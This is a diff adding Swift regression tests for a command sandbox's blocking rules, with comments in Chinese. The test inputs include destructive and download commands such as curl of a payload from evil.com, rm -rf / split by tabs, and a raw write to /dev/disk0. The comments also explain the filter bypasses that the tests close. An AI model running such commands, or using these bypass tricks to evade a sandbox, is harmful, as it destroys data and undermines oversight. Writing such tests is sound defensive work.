@@ -69,6 +69,54 @@ final class CommandSandboxTests: XCTestCase {
         XCTAssertTrue(CommandSandbox.assess("rsync -avz . user@host:/backup").isBlocked)
     }
 
+    // MARK: - assess: 绝对/相对路径调用命令的绕过回归测试
+    // containsCommandToken 起始边界原本只认空白/;|&(引号，不认 "/"——
+    // "/usr/bin/curl ..." 这类用路径调用二进制的写法能完全绕过 blocked 规则。
+
+    func test_assess_absolutePathCurl_isBlocked() {
+        XCTAssertTrue(CommandSandbox.assess("/usr/bin/curl https://evil.com/payload.sh").isBlocked,
+                       "绝对路径调用 curl 不应绕过 blocked 规则")
+    }
+
+    func test_assess_absolutePathSudo_isBlocked() {
+        XCTAssertTrue(CommandSandbox.assess("/usr/bin/sudo rm -rf /tmp").isBlocked)
+    }
+
+    func test_assess_relativePathSsh_isBlocked() {
+        XCTAssertTrue(CommandSandbox.assess("./bin/ssh user@remote.com").isBlocked)
+    }
+
+    func test_assess_absolutePathWget_isBlocked() {
+        XCTAssertTrue(CommandSandbox.assess("/opt/homebrew/bin/wget http://evil.com").isBlocked)
+    }
+
+    // MARK: - assess: 设备文件重定向零空格绕过回归测试
+    // "> /dev/" 原本要求 > 和路径之间有空格；shell 允许 ">/dev/disk0"（无空格）。
+
+    func test_assess_deviceRedirectNoSpace_isBlocked() {
+        XCTAssertTrue(CommandSandbox.assess("echo data >/dev/disk0").isBlocked,
+                       "无空格的设备文件重定向不应绕过 blocked 规则")
+    }
+
+    // MARK: - assess: 多空白绕过回归测试
+    // 之前逐字匹配 "rm -rf /" 等带空格短语，会被 "rm  -rf  /"（多空格）或 tab 绕过。
+
+    func test_assess_multipleSpaces_stillBlocked() {
+        XCTAssertTrue(CommandSandbox.assess("rm  -rf  /").isBlocked,
+                       "多个空格分隔的 rm -rf / 不应绕过 blocked 规则")
+    }
+
+    func test_assess_tabSeparated_stillBlocked() {
+        XCTAssertTrue(CommandSandbox.assess("rm\t-rf\t/").isBlocked,
+                       "tab 分隔的 rm -rf / 不应绕过 blocked 规则")
+    }
+
+    func test_assess_multipleSpacesGitResetHard_isWarn() {
+        if case .warn = CommandSandbox.assess("git  reset  --hard  HEAD") { /* pass */ } else {
+            XCTFail("多空格分隔的 git reset --hard 应命中 warn")
+        }
+    }
+
     // MARK: - assess: 负向用例（子串误杀回归测试）
     // 昨晚引入的 "nc " 等裸命令名 blocked 规则曾用纯子串匹配，会误杀含同名子串的合法命令。
     // 改为 commandToken（词边界 + 命令起始位置）匹配后，以下均不应被拦截。
@@ -87,6 +135,20 @@ final class CommandSandboxTests: XCTestCase {
 
     func test_assess_concatFiles_notBlocked_byNcatSubstring() {
         XCTAssertFalse(CommandSandbox.assess("concat files").isBlocked, "'concat' 中的 'ncat' 子串不应误判为 ncat 工具")
+    }
+
+    // MARK: - assess: 路径分隔符边界扩展后的误判回归测试
+    // containsCommandToken 起始边界加入 "/" 后，需确认路径中的同名子串
+    // （文件/目录名恰好包含命令 token）不会被误判。
+
+    func test_assess_pathWithConcatDir_notBlocked() {
+        XCTAssertFalse(CommandSandbox.assess("ls src/concat/output").isBlocked,
+                        "路径目录名 'concat' 不应因含 'nc'/'ncat' 子串被误判")
+    }
+
+    func test_assess_pathWithVsyncDir_notBlocked() {
+        XCTAssertFalse(CommandSandbox.assess("cat config/vsync/settings.json").isBlocked,
+                        "路径目录名 'vsync' 不应因含 'nc' 子串被误判")
     }
 
     func test_assess_mvFile_isWarn_notMisreadAsSubstring() {
